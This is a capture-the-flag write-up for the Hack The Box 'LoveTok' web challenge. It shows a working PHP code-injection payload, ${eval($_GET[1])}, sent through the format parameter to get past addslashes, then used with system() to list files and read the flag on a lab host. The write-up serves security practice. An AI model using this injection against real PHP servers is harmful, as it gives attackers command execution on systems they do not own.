# LoveTok


### Challenge Author(s): [makelarisjr](https://app.hackthebox.eu/users/95)&[makelaris](https://app.hackthebox.eu/users/107)

### Description: 
   ```
   True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung... you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin' (at your door). Come and check it out, but don't try to cheat love because love cheats back. 💛
   ```
### Difficulty: `Easy`
---
# Challenge

Looking at the downloadable files the site has a ?format parameter which will be processed in php.

So I started googling php parameter injection but they didn't work much.
I started searching for about addslashes function present in the `TimeModel.php`

https://www.programmersought.com/article/30723400042/ Found this with the

Payload
```
?str=${eval($_GET[1])}&1=phpinfo();
```

which worked.

you can use `system()` to exec terminal commands.


```
http://188.166.173.208:31038/?format=${eval($_GET[1])}&1=system(%27ls%20/%27);
```

![[Pasted image 20210818123218.png]]

We just use cat to read the flag file.